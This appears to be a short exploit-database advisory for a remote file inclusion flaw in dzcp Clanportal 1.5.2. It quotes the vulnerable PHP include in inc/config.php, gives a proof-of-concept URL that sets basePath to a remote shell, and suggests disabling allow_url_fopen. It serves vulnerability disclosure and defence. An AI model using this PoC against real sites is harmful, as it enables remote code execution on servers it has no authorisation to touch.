[+]  deV!L`z Clanportal 1.5.2 Remote File Include Vulnerability

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1                    ######################################            1
0                    I'm cr4wl3r  member from Inj3ct0r Team            1
1                    ######################################            0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

[+] Discovered By: cr4wl3r
[+] Download: http://www.dzcp.de/downloads/?action=download&id=131
[x] Code in [dzcp1.5.2/inc/config.php]

## REQUIRES ##
require_once($basePath."/inc/mysql.php");  <--- RFI

function show($tpl, $array)
{
  global $tmpdir;
    $template = "../inc/_templates_/".$tmpdir."/".$tpl;
  
    if($fp = @fopen($template.".".html, "r"))
      $tpl = @fread($fp, filesize($template.".".html));
    
    $array['dir'] = '../inc/_templates_/'.$tmpdir;
    foreach($array as $value => $code)
    {
      $tpl = str_replace('['.$value.']', $code, $tpl);
    }
  return $tpl;
}

[+] PoC: [path]/inc/config.php?basePath=[Shell]

[+] Solution: Change php.ini and set allow_url_fopen to Off